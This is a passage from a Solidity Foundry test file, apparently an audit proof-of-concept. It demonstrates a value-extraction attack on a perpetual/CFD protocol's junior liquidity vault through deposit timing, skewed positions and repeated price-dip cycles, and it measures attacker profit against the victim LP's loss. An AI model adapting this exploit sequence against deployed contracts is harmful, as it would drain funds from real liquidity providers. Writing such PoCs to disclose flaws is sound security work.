        uint256 victim0 = _valueOf(JUNIOR_LP);
        // 1) deep pool
        vm.startPrank(A);
        usdg.approve(address(juniorVault), DEP);
        uint256 depId = juniorVault.requestDeposit(DEP, A, A);
        vm.stopPrank();
        _toBoundary(depId);
        _settleAsA();
        vm.prank(A);
        uint256 shares = juniorVault.claimDeposit(depId, DEP, A, A);
        // 2) max skew at deep depth
        uint256 eq0 = _juniorEquity();
        _assertExecuted(_open(A2, CfdTypes.Side.SHORT, MAX_SKEW_SIZE, 100_000e6, START_PRICE), "skew open");
        _pushMark(START_PRICE);
        console2.log("VPI paid by skew account into Junior", _juniorEquity() - eq0);
        // 3) attacker LP leaves
        vm.warp(juniorVault.lastDepositTime(A) + juniorVault.DEPOSIT_COOLDOWN());
        vm.prank(A);
        uint256 redId = juniorVault.requestRedeem(shares, A, A);
        _toBoundary(redId);
        _settleAsA();
        uint256 claimable = juniorVault.claimableRedeemRequest(redId, A);
        require(claimable == shares, "exit not fully funded");
        vm.prank(A);
        juniorVault.claimRedeem(redId, claimable, A, A);
        _pushMark(START_PRICE);
        console2.log("victim value before dip cycles", _valueOf(JUNIOR_LP));
        // 4) dip cycles
        for (uint256 i; i < cycles; ++i) {
            _dipCycleSized(CfdTypes.Side.LONG, DIP_LONG_SIZE, dip, early);
            console2.log("victim value after cycle", _valueOf(JUNIOR_LP));
        }
        // 5) skew account closes (gets its own VPI back via the clamp)
        _assertExecuted(_close(A2, CfdTypes.Side.SHORT, _positionSize(A2), START_PRICE), "skew close");
        _pushMark(START_PRICE);
        attackerPnl = int256(_wealth(A) + _wealth(A2)) - int256(wealth0);
        victimDelta = int256(_valueOf(JUNIOR_LP)) - int256(victim0);
    }

    function test_M_maxExtraction_attackVsControl() public {
        uint256 snap = vm.snapshotState();
        (int256 pAttack, int256 vAttack) = _maxExtraction(2, true, false);
        vm.revertToState(snap);
        (int256 pControl, int256 vControl) = _maxExtraction(2, false, false);
        _report("ATTACK max-extraction (2 dip cycles)", pAttack, vAttack);
        _report("CONTROL max-extraction (same flows, no dip legs)", pControl, vControl);
        assertGt(pAttack, 0);
        assertLt(vAttack, 0);
    }

    function test_N_maxExtraction_unrelatedKeeperSettles() public {
        uint256 snap = vm.snapshotState();
        (int256 pAttack, int256 vAttack) = _maxExtraction(1, true, true);
        vm.revertToState(snap);
        (int256 pControl, int256 vControl) = _maxExtraction(1, false, true);
        _report("ATTACK open at boundary-2min, unrelated keeper settles (1 cycle)", pAttack, vAttack);
        _report("CONTROL same timing, no dip leg", pControl, vControl);
        assertGt(pAttack, pControl);
        assertLt(vAttack, vControl);
    }
}
```

